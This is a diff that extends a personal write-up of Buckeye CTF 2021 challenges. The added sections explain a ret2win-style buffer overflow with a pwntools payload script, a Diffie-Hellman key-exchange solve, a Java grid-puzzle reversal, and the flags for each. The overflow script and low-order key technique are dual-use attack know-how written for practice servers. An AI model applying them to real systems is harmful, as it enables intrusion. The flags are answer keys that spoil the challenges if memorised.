@@ -835,7 +835,7 @@ diffie_hellman(FLAG)
 
 ```
 
-Cool challenge which again involved exploiting the concept of a low order. We aren't given the public key of the other person so we can't compute the shared secret. However by taking a consecutive set of modular square roots of 1 with respect to the prime `p`, one can generate a public key `B` which only has an order of 4 hence having only 4 possible values of the key which is used to encrypt the flag.
+Cool challenge which again involved exploiting the concept of a low order. We aren't given the public key of the other person so we can't compute the shared secret. However by taking a consecutive set of modular square roots of 1 with respect to the prime `p`, one can generate a public key `B` which only has an order of 4 (by Lagrange's theorem as the order of the subgroup divides the order of the group) hence having only 4 possible values of the key which is used to encrypt the flag. 
 
 The solve script :
 
@@ -886,7 +886,7 @@ while True:
 
 ```
 
-<p> <b>Flag :</b> buckeye{r0ots_0f_uN1Ty_w0rk_f0r_th1s???} </p>
+<p> <b>Flag :</b> buckeye{sup3r_dup3r_t1ny_m1cr0sc0p1c_subgr0up5!} </p>
 
 <br/>
 
@@ -931,4 +931,160 @@ int main() {
 ```
 
 The accompanying challenge files can be found <a href="https://github.com/Angmar2722/Angmar2722.github.io/tree/master/assets/ctfFiles/2021/buckeye2021/pwn/ret4win" target="_blank">here</a>.
+
+We can obviously overflow the buffer in `vuln` as the program reads more than 32 bytes (24 more than the buffer size). After overflowing the buffer and base pointer, we can jump to the `win` function. Although the conditions for the arguments are not met, one can note (when debugging with GDB) that when returning from `win`, the address in the `rax` register (the return value of the callee function) corresponds to the address right before the system call which cats the flag. This jumping to that address would mean that the command is executed and the flag printed.
+
+The solve script :
+
+```pyfrom pwn import *
+
+winAddr = 0x4011e0
+raxSysCall = 0x401245
+
+payload = b'A'*40 + p64(winAddr) + p64(raxSysCall)
+r = remote('pwn.chall.pwnoh.io', 13379)
+
+r.recvuntil('Please leave a message at the tone: **beep**\n')
+r.sendline(payload)
+print(r.recvall())
+#buckeye{ret2win_t1m3s_tw0_1s_ret4win_1_guess}
+
+```
+
+<p> <b>Flag :</b> buckeye{ret2win_t1m3s_tw0_1s_ret4win_1_guess} </p>
+
+<br/>
+
+## Buttons
+
+![Buckeye 2021 CTF Writeup](/assets/img/ctfImages/2021/buckeye2021/img9.png)
+
+The `jar` file can be found <a href="https://github.com/Angmar2722/Angmar2722.github.io/blob/master/assets/ctfFiles/2021/buckeye2021/rev/buttons/Buttons.jar" target="_blank">here</a>. Diasassembling the file using <a href="http://java-decompiler.github.io/" target="_blank">this Java decompiler</a>, one can obtain the source code of the program. I was facing issues using it as mentioned in <a href="https://github.com/java-decompiler/jd-gui/issues/360" target="_blank">this thread</a> (fixed by changing the JDK version). A rough dump of that can be found <a href="https://github.com/Angmar2722/Angmar2722.github.io/blob/master/assets/ctfFiles/2021/buckeye2021/rev/buttons/disassembledJava.txt" target="_blank">here</a>.
+
+Running the file provides us with a grid of buttons. Our objective is to move across the grid and towards the flag icon after which the flag is printed. Pressing the wrong button would mean an illegal move and hence the entire progress is reset. In order to ascertain which button which when pressed was a legal move, one cna look at the source code and see that in the array which represents the grid, the 0 buttons represent permissible moves while the 1 button represents illegal moves. Hence one could trace the path needed to get to the flag like so :
+
+![Buckeye 2021 CTF Writeup](/assets/img/ctfImages/2021/buckeye2021/img10.png)
+
+Hence going by that route, one can obtain the flag.
+
+<p> <b>Flag :</b> buckeye{am4z1ng_j0b_y0u_b1g_j4va_h4ck3r} </p>
+
+<br/>
+
+## Key Exchange
+
+![Buckeye 2021 CTF Writeup](/assets/img/ctfImages/2021/buckeye2021/img8.png)
+
+The server source code provided :
+
+```python
+
+import random
+import hashlib
+
+# Mac/Linux: pip3 install pycryptodome
+# Windows: py -m pip install pycryptodome
+import Crypto.Util.number as cun
+from Crypto.Cipher import AES
+
+rand = random.SystemRandom()
+FLAG = b"buckeye{???????????????????????????????????????????????????????}"
+
+
+def diffie_hellman(message: bytes):
+    p = cun.getPrime(512)
+    g = 5
+    print(f"p = {p}")
+    print(f"g = {g}")
+
+    a = rand.randrange(2, p - 1)  # private key
+    A = pow(g, a, p)  # public key
+
+    # g ^ a === A  (mod p)
+    # It's computationally infeasible for anyone else to derive a from A
+    print(f"A = {A}")
+
+    B = int(input("Give me your public key B: "))
+    if not (1 < B < p - 1):
+        print("Suspicious public key")
+        return
+
+    # B ^ a === (g ^ b) ^ a === g ^ (ab)  (mod p)
+    # Nobody can derive this shared secret except us!
+    shared_secret = pow(B, a, p)
+
+    # Use AES, a symmetric cipher, to encrypt the flag using the shared key
+    key = hashlib.sha1(cun.long_to_bytes(shared_secret)).digest()[:16]
+    cipher = AES.new(key, AES.MODE_ECB)
+    ciphertext = cipher.encrypt(message)
+    print(f"ciphertext = {ciphertext.hex()}")
+
+
+print("I'm going to send you the flag.")
+print("However, I noticed that an FBI agent has been eavesdropping on my messages,")
+print("so I'm going to send it to you in a way that ONLY YOU can decrypt the flag.")
+print()
+diffie_hellman(FLAG)
+
+```
+
+Compute the shared secret and then decrypt the flag.
+
+The solve script :
+
+```py
+
+from pwn import *
+from Crypto.Util.number import *
+from Crypto.Cipher import AES
+
+
+debug = True
+r = remote("crypto.chall.pwnoh.io", 13374, level = 'debug' if debug else None)
+
+r.recvuntil('p = ')
+p = int(r.recvline())
+assert isPrime(p)
+
+g = 5
+r.recvuntil('A = ')
+A = int(r.recvline())
+
+B = pow(g, 57, p)
+ss = pow(A, 57, p)
+
+r.sendlineafter('Give me your public key B: ', str(B))
+r.recvuntil('ciphertext = ')
+ct = r.recvline(keepends=False).decode()
+
+key = hashlib.sha1(long_to_bytes(ss)).digest()[:16]
+cipher = AES.new(key, AES.MODE_ECB)
+print(cipher.decrypt(bytes.fromhex(ct)))
+
+```
+
+<p> <b>Flag :</b> buckeye{DH_1s_s0_h3ck1ng_c00l_l1k3_wh0_w0uldv3_th0ught_0f_th1s?} </p>
+
+<br/>
+
+## Survey
+
+![Buckeye 2021 CTF Writeup](/assets/img/ctfImages/2021/buckeye2021/img11.png)
+
+Fill out the survey to get the flag.
+
+<p> <b>Flag :</b> buckeye{th4nk5_f0r_pl4y1ng} </p>
+
+<br/>
+
+## Sanity Check
+
+![Buckeye 2021 CTF Writeup](/assets/img/ctfImages/2021/buckeye2021/img12.png)
+
+Find the flag in the Discord server.
+
+<p> <b>Flag :</b> buckeye{thX_4_p1ayin9} </p>
+
+<br/>
+
 
